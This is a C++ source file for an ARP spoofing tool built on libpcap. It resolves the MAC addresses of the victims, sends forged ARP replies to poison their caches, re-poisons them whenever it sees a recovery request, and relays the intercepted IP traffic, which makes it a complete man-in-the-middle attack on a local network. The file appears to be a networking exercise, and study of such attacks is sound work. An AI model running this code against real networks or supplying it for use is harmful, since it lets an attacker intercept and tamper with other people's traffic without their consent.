#include <pcap.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <net/if.h>
#include <unistd.h>
#include <string.h>
#include <vector>
#include <map>
#include <utility>
#include "arpheader.h"
#include "editpacket.h"
#include "getmy.h"
using namespace std;

struct mac {
  uint8_t addr[6];
};

void usage() {
  printf("syntax: arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
  printf("sample: arp_spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

int main(int argc, char* argv[]) {
  if (argc < 4 || argc % 2 == 1) {
    usage();
    return -1;
  }

  char* dev = argv[1];
  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  }

  uint8_t attackermac[ETH_ALEN]; // 6
  uint32_t attackerip;
  if(getmymac(attackermac) == -1) {
    printf("get my mac addr error\n");
    return -1;
  }
  if(getmyip(dev, &attackerip) == -1) {
    printf("get my ip addr error\n");
    return -1;
  }

  vector<pair<uint32_t, uint32_t> > sendertargetip;
  map<uint32_t, mac> iptomac;

  for(int i=2; i<argc; i+=2)
  {
    uint32_t senderip = inet_addr(argv[i]);
    uint32_t targetip = inet_addr(argv[i+1]);
    sendertargetip.push_back(make_pair(senderip, targetip));
  }
  uint8_t packet[60]; // for arp packet
  uint8_t broadmac[ETH_ALEN] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
  uint8_t unknown[ETH_ALEN] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  int size = (argc - 2) / 2;

  struct mac tem;
  for(int i=0; i<size*2; i++)
  {
    // arp request
    uint32_t ip;
    if(i % 2)
      ip = sendertargetip[i / 2].second; // targetip
    else
      ip = sendertargetip[i / 2].first; // senderip
    if(iptomac.find(ip) != iptomac.end())
      continue;
    makearp(packet, broadmac, attackermac, ETHERTYPE_ARP, ARPHRD_ETHER, ETHERTYPE_IP, ETH_ALEN, 0x04, ARPOP_REQUEST, attackermac, attackerip, unknown, ip);
    
    if(pcap_sendpacket(handle, packet, ETH_HLEN + 28) != 0)
    {
      fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(handle));
      pcap_close(handle);
      return -1;
    }

    // arp reply
    while (true) {
      struct pcap_pkthdr* header;
      const u_char* packet2;
      int res = pcap_next_ex(handle, &header, &packet2);
      if (res == 0) continue;
      if (res == -1 || res == -2) break;

      ether_header* temeth = (ether_header*)packet2;
      if(ntohs(temeth -> ether_type) != ETHERTYPE_ARP || memcmp(attackermac, temeth -> ether_dhost, 6) != 0)
        continue;

      arp_header* temarp = (arp_header*)(packet2 + ETH_HLEN);
      if(ntohs(temarp -> arp_op) != ARPOP_REPLY || temarp -> arp_spa != ip) 
        continue;
      memcpy(tem.addr, temeth -> ether_shost, ETH_ALEN);
      iptomac[ip] = tem;
      break;
    }
  }

  // sending arp spoof
  for(int i=0; i<size; i++)
  {
    uint32_t senderip = sendertargetip[i].first;
    uint32_t targetip = sendertargetip[i].second;
    makearp(packet, iptomac[senderip].addr, attackermac, ETHERTYPE_ARP, ARPHRD_ETHER, ETHERTYPE_IP, ETH_ALEN, 0x04, ARPOP_REPLY, attackermac, targetip, iptomac[senderip].addr, senderip);
  
    int cnt = 3;
    while(cnt--)
    {
      if(pcap_sendpacket(handle, packet, ETH_HLEN + 28) != 0)
      {
        fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(handle));
        pcap_close(handle);
        return -1;
      }
    }
  }
  printf("Sending all arp_reply(spoofing)\n");
  printf("Relaying IP packet started\n");
  uint8_t relayippacket[6000];
  while (true) {
    struct pcap_pkthdr* header;
    const u_char* packet2;
    int res = pcap_next_ex(handle, &header, &packet2);
    if (res == 0) continue;
    if (res == -1 || res == -2) break;

    ether_header* temeth = (ether_header*)packet2;
    if(ntohs(temeth -> ether_type) == ETHERTYPE_IP)
    {
      iphdr* temip = (iphdr*)(packet2 + ETH_HLEN);
      for(int i=0; i<size; i++)
      {
        uint32_t senderip = sendertargetip[i].first;
        uint32_t targetip = sendertargetip[i].second;
        if(memcmp(iptomac[senderip].addr, temeth -> ether_shost, 6) != 0 || temip -> daddr != targetip)
          continue;
        int packetlen = header -> caplen;
        makeRelaypacket(packet2, packetlen, relayippacket, attackermac, iptomac[targetip].addr);
        if(pcap_sendpacket(handle, relayippacket, packetlen) != 0)
        {
          fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(handle));
          pcap_close(handle);
          return -1;
        }
        break;
      }
    }	
    else if(ntohs(temeth -> ether_type) == ETHERTYPE_ARP)
    {
      for(int i=0; i<size; i++)
      {
        uint32_t senderip = sendertargetip[i].first;
        uint32_t targetip = sendertargetip[i].second;
        bool chk = false;
        arp_header* temarp = (arp_header*)(packet2 + ETH_HLEN);
        if(memcmp(iptomac[senderip].addr, temeth -> ether_shost, 6) == 0 && memcmp(broadmac, temeth -> ether_dhost, 6) == 0 && ntohs(temarp -> arp_op) == ARPOP_REQUEST && temarp -> arp_tpa == targetip)
          chk = true;
        else if(memcmp(iptomac[targetip].addr, temeth -> ether_shost, 6) == 0 && memcmp(broadmac, temeth -> ether_dhost, 6) == 0 && ntohs(temarp -> arp_op) == ARPOP_REQUEST)
          chk = true;
        else if(memcmp(iptomac[targetip].addr, temeth -> ether_shost, 6) == 0 && temarp -> arp_tpa == senderip && ntohs(temarp -> arp_op) == ARPOP_REQUEST)
          chk = true;
        else if(memcmp(iptomac[senderip].addr, temeth -> ether_shost, 6) == 0 && temarp -> arp_tpa == targetip && ntohs(temarp -> arp_op) == ARPOP_REQUEST)
          chk = true;
        if(!chk)
          continue;
        makearp(packet, iptomac[senderip].addr, attackermac, ETHERTYPE_ARP, ARPHRD_ETHER, ETHERTYPE_IP, ETH_ALEN, 0x04, ARPOP_REPLY, attackermac, targetip, iptomac[senderip].addr, senderip);
        int cnt = 3;
        while(cnt--)
        {
          if(pcap_sendpacket(handle, packet, ETH_HLEN + 28) != 0)
          {
            fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(handle));
            pcap_close(handle)	;
            return -1;
          }
        }
      }
    }
  }
  pcap_close(handle);
  return 0;
}
